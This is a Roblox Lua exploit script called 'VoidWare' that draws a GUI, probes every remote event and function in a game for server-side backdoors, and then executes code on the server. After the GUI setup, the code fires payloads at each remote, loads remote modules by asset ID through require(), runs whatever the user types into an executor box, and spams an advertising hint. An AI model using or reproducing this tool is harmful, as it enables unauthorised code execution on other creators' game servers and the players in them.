local CollectionService = game:GetService("CollectionService")
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")

local function centerFrame(frame)
    frame.AnchorPoint = Vector2.new(0.5, 0.5)
    frame.Position = UDim2.new(0.5, 0, 0.5, 0)
end

local function createGlowEffect(frame)
    local glow = Instance.new("UIStroke")
    glow.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    glow.Color = Color3.fromRGB(138, 0, 255)
    glow.Thickness = 2
    glow.Transparency = 0.7
    glow.Parent = frame
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 8)
    corner.Parent = frame
    return glow, corner
end

local function createHoverEffect(button)
    local originalSize = button.Size
    local originalColor = button.BackgroundColor3
    local hoverColor = Color3.fromRGB(35, 35, 35)
    
    button.MouseEnter:Connect(function()
        local tween = TweenService:Create(button, TweenInfo.new(0.2), {
            BackgroundColor3 = hoverColor,
            Size = originalSize + UDim2.new(0.02, 0, 0.02, 0)
        })
        tween:Play()
    end)
    
    button.MouseLeave:Connect(function()
        local tween = TweenService:Create(button, TweenInfo.new(0.2), {
            BackgroundColor3 = originalColor,
            Size = originalSize
        })
        tween:Play()
    end)
end

local scanningGUI = Instance.new("ScreenGui")
scanningGUI.Name = "VoidWareScanner"
scanningGUI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
scanningGUI.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")
CollectionService:AddTag(scanningGUI, "main")

local VoidWare_2 = Instance.new("Frame")
VoidWare_2.BorderSizePixel = 0
VoidWare_2.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
VoidWare_2.BackgroundTransparency = 0.1
VoidWare_2.Size = UDim2.new(0.46186, 0, 0.65643, 0)
VoidWare_2.Name = "VoidWare"
centerFrame(VoidWare_2)
VoidWare_2.Parent = scanningGUI

local mainGlow, mainCorner = createGlowEffect(VoidWare_2)

local gradient = Instance.new("UIGradient")
gradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(138, 0, 255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(80, 0, 255))
})
gradient.Rotation = 45
mainGlow:SetAttribute("Gradient", gradient)

local TextButton2_4 = Instance.new("TextButton")
TextButton2_4.TextWrapped = true
TextButton2_4.BorderSizePixel = 0
TextButton2_4.TextSize = 36
TextButton2_4.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton2_4.BackgroundColor3 = Color3.fromRGB(24, 24, 24)
TextButton2_4.BackgroundTransparency = 0.1
TextButton2_4.FontFace = Font.new("rbxasset://fonts/families/ComicNeueAngular.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
TextButton2_4.Size = UDim2.new(0.99479, 0, 0.83621, 0)
TextButton2_4.Text = "Scan for backdoor"
TextButton2_4.Name = "TextButton2"
TextButton2_4.Position = UDim2.new(0, 2, 0, 36)
TextButton2_4.Parent = VoidWare_2

local buttonGlow = Instance.new("UIStroke")
buttonGlow.Color = Color3.fromRGB(138, 0, 255)
buttonGlow.Thickness = 1.5
buttonGlow.Parent = TextButton2_4

local buttonCorner = Instance.new("UICorner")
buttonCorner.CornerRadius = UDim.new(0, 6)
buttonCorner.Parent = TextButton2_4

local buttonGradient = Instance.new("UIGradient")
buttonGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(138, 0, 255)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(160, 0, 255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(138, 0, 255))
})
buttonGradient.Parent = buttonGlow

createHoverEffect(TextButton2_4)

local TextLabel_6 = Instance.new("TextLabel")
TextLabel_6.TextWrapped = true
TextLabel_6.BorderSizePixel = 0
TextLabel_6.TextXAlignment = Enum.TextXAlignment.Left
TextLabel_6.TextScaled = true
TextLabel_6.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
TextLabel_6.BackgroundTransparency = 0.1
TextLabel_6.FontFace = Font.new("rbxasset://fonts/families/Inconsolata.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
TextLabel_6.TextColor3 = Color3.fromRGB(153, 0, 255)
TextLabel_6.Size = UDim2.new(0.98958, 0, 0.12931, 0)
TextLabel_6.Text = "VoidWare"
TextLabel_6.Position = UDim2.new(0, 2, 0, 2)
TextLabel_6.Parent = VoidWare_2

local titleGlow = Instance.new("UIStroke")
titleGlow.Color = Color3.fromRGB(153, 0, 255)
titleGlow.Thickness = 1
titleGlow.Parent = TextLabel_6

local titleCorner = Instance.new("UICorner")
titleCorner.CornerRadius = UDim.new(0, 4)
titleCorner.Parent = TextLabel_6

local TextButton_8 = Instance.new("TextButton")
TextButton_8.TextWrapped = true
TextButton_8.BorderSizePixel = 0
TextButton_8.TextScaled = true
TextButton_8.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_8.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
TextButton_8.Size = UDim2.new(0.07813, 0, 0.12931, 0)
TextButton_8.Text = "×"
TextButton_8.Name = "CloseButton"
TextButton_8.Position = UDim2.new(0, 352, 0, 2)
TextButton_8.ZIndex = 2
TextButton_8.Parent = VoidWare_2

local closeGlow = Instance.new("UIStroke")
closeGlow.Color = Color3.fromRGB(255, 50, 50)
closeGlow.Thickness = 1.5
closeGlow.ZIndex = 2
closeGlow.Parent = TextButton_8

local closeCorner = Instance.new("UICorner")
closeCorner.CornerRadius = UDim.new(0, 4)
closeCorner.ZIndex = 2
closeCorner.Parent = TextButton_8

createHoverEffect(TextButton_8)

local UIStroke_a = Instance.new("UIStroke")
UIStroke_a.Color = Color3.fromRGB(40, 40, 40)
UIStroke_a.Thickness = 2
UIStroke_a.Parent = VoidWare_2

local executorGUI = Instance.new("ScreenGui")
executorGUI.Name = "VoidWareExecutor"
executorGUI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
executorGUI.Enabled = false
executorGUI.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")
CollectionService:AddTag(executorGUI, "main")

local VoidWareExecutor_2 = Instance.new("Frame")
VoidWareExecutor_2.BorderSizePixel = 0
VoidWareExecutor_2.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
VoidWareExecutor_2.BackgroundTransparency = 0.1
VoidWareExecutor_2.Size = UDim2.new(0.46186, 0, 0.65643, 0)
VoidWareExecutor_2.Name = "VoidWare"
centerFrame(VoidWareExecutor_2)
VoidWareExecutor_2.Parent = executorGUI

local execGlow, execCorner = createGlowEffect(VoidWareExecutor_2)

local execGradient = Instance.new("UIGradient")
execGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 255, 140)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 200, 255))
})
execGradient.Rotation = 45
execGlow:SetAttribute("Gradient", execGradient)

local Clear_3 = Instance.new("TextButton")
Clear_3.BorderSizePixel = 0
Clear_3.TextSize = 24
Clear_3.TextColor3 = Color3.fromRGB(255, 255, 255)
Clear_3.BackgroundColor3 = Color3.fromRGB(27, 27, 27)
Clear_3.BackgroundTransparency = 0.1
Clear_3.FontFace = Font.new("rbxasset://fonts/families/ComicNeueAngular.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
Clear_3.Size = UDim2.new(0.20833, 0, 0.14655, 0)
Clear_3.Text = "Clear"
Clear_3.Name = "Clear"
Clear_3.Position = UDim2.new(0, 88, 0, 196)
Clear_3.Parent = VoidWareExecutor_2

local clearGlow = Instance.new("UIStroke")
clearGlow.Color = Color3.fromRGB(112, 10, 255)
clearGlow.Thickness = 1.5
clearGlow.Parent = Clear_3

local clearCorner = Instance.new("UICorner")
clearCorner.CornerRadius = UDim.new(0, 6)
clearCorner.Parent = Clear_3

createHoverEffect(Clear_3)

local Exe_5 = Instance.new("TextButton")
Exe_5.BorderSizePixel = 0
Exe_5.TextSize = 24
Exe_5.TextColor3 = Color3.fromRGB(255, 255, 255)
Exe_5.BackgroundColor3 = Color3.fromRGB(27, 27, 27)
Exe_5.BackgroundTransparency = 0.1
Exe_5.FontFace = Font.new("rbxasset://fonts/families/ComicNeueAngular.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
Exe_5.Size = UDim2.new(0.20833, 0, 0.14655, 0)
Exe_5.Text = "Execute"
Exe_5.Name = "Exe"
Exe_5.Position = UDim2.new(0, 4, 0, 196)
Exe_5.Parent = VoidWareExecutor_2

local exeGlow = Instance.new("UIStroke")
exeGlow.Color = Color3.fromRGB(0, 255, 100)
exeGlow.Thickness = 1.5
exeGlow.Parent = Exe_5

local exeCorner = Instance.new("UICorner")
exeCorner.CornerRadius = UDim.new(0, 6)
exeCorner.Parent = Exe_5

createHoverEffect(Exe_5)

local TextButton_8_exec = Instance.new("TextButton")
TextButton_8_exec.TextWrapped = true
TextButton_8_exec.BorderSizePixel = 0
TextButton_8_exec.TextScaled = true
TextButton_8_exec.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_8_exec.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
TextButton_8_exec.Size = UDim2.new(0.07813, 0, 0.12931, 0)
TextButton_8_exec.Text = "×"
TextButton_8_exec.Name = "CloseButton"
TextButton_8_exec.Position = UDim2.new(0, 352, 0, 2)
TextButton_8_exec.ZIndex = 2
TextButton_8_exec.Parent = VoidWareExecutor_2

local closeGlowExec = Instance.new("UIStroke")
closeGlowExec.Color = Color3.fromRGB(255, 50, 50)
closeGlowExec.Thickness = 1.5
closeGlowExec.ZIndex = 2
closeGlowExec.Parent = TextButton_8_exec

local closeCornerExec = Instance.new("UICorner")
closeCornerExec.CornerRadius = UDim.new(0, 4)
closeCornerExec.ZIndex = 2
closeCornerExec.Parent = TextButton_8_exec

createHoverEffect(TextButton_8_exec)

local TextLabel_a = Instance.new("TextLabel")
TextLabel_a.TextWrapped = true
TextLabel_a.BorderSizePixel = 0
TextLabel_a.TextXAlignment = Enum.TextXAlignment.Left
TextLabel_a.TextScaled = true
TextLabel_a.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
TextLabel_a.BackgroundTransparency = 0.1
TextLabel_a.FontFace = Font.new("rbxasset://fonts/families/Inconsolata.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
TextLabel_a.TextColor3 = Color3.fromRGB(0, 255, 140)
TextLabel_a.Size = UDim2.new(0.98958, 0, 0.12931, 0)
TextLabel_a.Text = "VoidWare"
TextLabel_a.Position = UDim2.new(0, 2, 0, 2)
TextLabel_a.Parent = VoidWareExecutor_2

local titleGlowExec = Instance.new("UIStroke")
titleGlowExec.Color = Color3.fromRGB(0, 255, 140)
titleGlowExec.Thickness = 1
titleGlowExec.Parent = TextLabel_a

local titleCornerExec = Instance.new("UICorner")
titleCornerExec.CornerRadius = UDim.new(0, 4)
titleCornerExec.Parent = TextLabel_a

local TextLabel2_c = Instance.new("TextLabel")
TextLabel2_c.TextWrapped = true
TextLabel2_c.BorderSizePixel = 0
TextLabel2_c.TextSize = 16
TextLabel2_c.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel2_c.FontFace = Font.new("rbxasset://fonts/families/Zekton.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
TextLabel2_c.TextColor3 = Color3.fromRGB(50, 255, 0)
TextLabel2_c.BackgroundTransparency = 1
TextLabel2_c.RichText = true
TextLabel2_c.Size = UDim2.new(0.15625, 0, 0.12931, 0)
TextLabel2_c.Text = "Made by StarFlow"
TextLabel2_c.Name = "TextLabel2"
TextLabel2_c.Position = UDim2.new(0, 320, 0, 198)
TextLabel2_c.Parent = VoidWareExecutor_2

local Sens_d = Instance.new("TextButton")
Sens_d.BorderSizePixel = 0
Sens_d.TextSize = 18
Sens_d.TextColor3 = Color3.fromRGB(255, 255, 255)
Sens_d.BackgroundColor3 = Color3.fromRGB(27, 27, 27)
Sens_d.BackgroundTransparency = 0.1
Sens_d.FontFace = Font.new("rbxasset://fonts/families/Ubuntu.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
Sens_d.Size = UDim2.new(0.38021, 0, 0.14655, 0)
Sens_d.Text = "Sensation Hub"
Sens_d.Name = "Sens"
Sens_d.Position = UDim2.new(0, 172, 0, 196)
Sens_d.Parent = VoidWareExecutor_2

local sensGlow = Instance.new("UIStroke")
sensGlow.Color = Color3.fromRGB(255, 0, 0)
sensGlow.Thickness = 1.5
sensGlow.Parent = Sens_d

local sensCorner = Instance.new("UICorner")
sensCorner.CornerRadius = UDim.new(0, 6)
sensCorner.Parent = Sens_d

createHoverEffect(Sens_d)

local TextBox_f = Instance.new("TextBox")
TextBox_f.CursorPosition = -1
TextBox_f.TextXAlignment = Enum.TextXAlignment.Left
TextBox_f.PlaceholderColor3 = Color3.fromRGB(149, 149, 149)
TextBox_f.BorderSizePixel = 0
TextBox_f.TextSize = 18
TextBox_f.TextYAlignment = Enum.TextYAlignment.Top
TextBox_f.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
TextBox_f.BackgroundTransparency = 0.1
TextBox_f.FontFace = Font.new("rbxasset://fonts/families/Inconsolata.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextBox_f.PlaceholderText = "Require script here..."
TextBox_f.Size = UDim2.new(0.97917, 0, 0.67241, 0)
TextBox_f.Position = UDim2.new(0, 4, 0, 36)
TextBox_f.Text = ""
TextBox_f.TextColor3 = Color3.fromRGB(200, 200, 200)
TextBox_f.Parent = VoidWareExecutor_2

local textBoxGlow = Instance.new("UIStroke")
textBoxGlow.Color = Color3.fromRGB(60, 60, 60)
textBoxGlow.Thickness = 1.5
textBoxGlow.Parent = TextBox_f

local textBoxCorner = Instance.new("UICorner")
textBoxCorner.CornerRadius = UDim.new(0, 6)
textBoxCorner.Parent = TextBox_f

local UIStroke_10 = Instance.new("UIStroke")
UIStroke_10.Color = Color3.fromRGB(40, 40, 40)
UIStroke_10.Thickness = 2
UIStroke_10.Parent = VoidWareExecutor_2

local backdoor = nil
local alphabet = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'}

function generateName(lenght)
    local text = ''
    for i = 1, lenght do
        text = text .. alphabet[math.random(1,#alphabet)]
    end
    return text
end

function runRemote(remote, data)
    if remote:IsA('RemoteEvent') then
        remote:FireServer(data)
    elseif remote:IsA('RemoteFunction') then
        spawn(function() remote:InvokeServer(data) end)
    end
end

function findRemote()
    local timee = os.clock()
    local remotes = {}
    
    local protected_backdoor = game:GetService('ReplicatedStorage'):FindFirstChild('lh'..game.PlaceId/6666*1337*game.PlaceId)
    if protected_backdoor and protected_backdoor:IsA('RemoteFunction') then
        while true do
            code = generateName(math.random(12,30))
            if not remotes[code] then break end
        end
        spawn(function() 
            protected_backdoor:InvokeServer('lalol hub join today!! discord.gg/XXqzxT7E5z', "a=Instance.new('Model',workspace)a.Name='"..code.."'") 
        end)
        remotes[code] = protected_backdoor
    end
    
    for i,remote in game:GetDescendants() do
        if not remote:IsA('RemoteEvent') and not remote:IsA('RemoteFunction') then 
            continue 
        end

        if string.split(remote:GetFullName(), '.')[1]=='RobloxReplicatedStorage' then
            continue
        end

        if remote.Parent==game:GetService("ReplicatedStorage") or remote.Parent.Parent==game:GetService("ReplicatedStorage") or remote.Parent.Parent.Parent==game:GetService("ReplicatedStorage") then
            if remote:FindFirstChild('__FUNCTION') or remote.Name=='__FUNCTION' then
                continue
            end

            if remote.Parent.Parent.Name=='HDAdminClient' and remote.Parent.Name=='Signals' then
                continue
            end

            if remote.Parent.Name=='DefaultChatSystemChatEvents' then
                continue
            end
        end

        while true do
            code = generateName(math.random(12,30))
            if not remotes[code] then break end
        end
        
        runRemote(remote, "a=Instance.new('Model',workspace)a.Name='"..code.."'")
        remotes[code] = remote
    end
    
    for i = 1, 100 do
        for i,remote in remotes do
            local code = i
            
            if workspace:FindFirstChild(code) then
                backdoor = remote
                scanningGUI.Enabled = false
                executorGUI.Enabled = true

                runRemote(remote, "require(171016405.1884*69)")            
                runRemote(remote, "a=Instance.new('Hint')a.Text='VoidWare | Free Backdoor Scanner'while true do a.Parent=workspace;wait(15)a:Remove()wait(30)end")
                
                return true
            end
        end
        task.wait()
    end

    return false
end

TextButton2_4.MouseButton1Click:Connect(function()
    TextButton2_4.Text = "Scanning..."
    TextButton2_4.TextColor3 = Color3.fromRGB(255, 255, 0)
    
    if not findRemote() then
        TextButton2_4.Text = "No backdoor :["
        TextButton2_4.TextColor3 = Color3.fromRGB(255, 0, 0)
    end
end)

Exe_5.MouseButton1Click:Connect(function()
    local scriptText = TextBox_f.Text
    if backdoor then
        runRemote(backdoor, scriptText)
        Exe_5.Text = "Executed!"
        task.wait(0.5)
        Exe_5.Text = "Execute"
    end
end)

Clear_3.MouseButton1Click:Connect(function()
    TextBox_f.Text = ""
    Clear_3.Text = "Cleared!"
    task.wait(0.5)
    Clear_3.Text = "Clear"
end)

Sens_d.MouseButton1Click:Connect(function()
    if backdoor then
        local playerName = game:GetService('Players').LocalPlayer.Name
        runRemote(backdoor, "require(100263845596551)('"..playerName.."')")
        Sens_d.Text = "Loaded!"
        task.wait(0.5)
        Sens_d.Text = "Sensation Hub"
    end
end)

TextButton_8.MouseButton1Click:Connect(function()
    scanningGUI:Destroy()
end)

TextButton_8_exec.MouseButton1Click:Connect(function()
    executorGUI:Destroy()
end)

return scanningGUI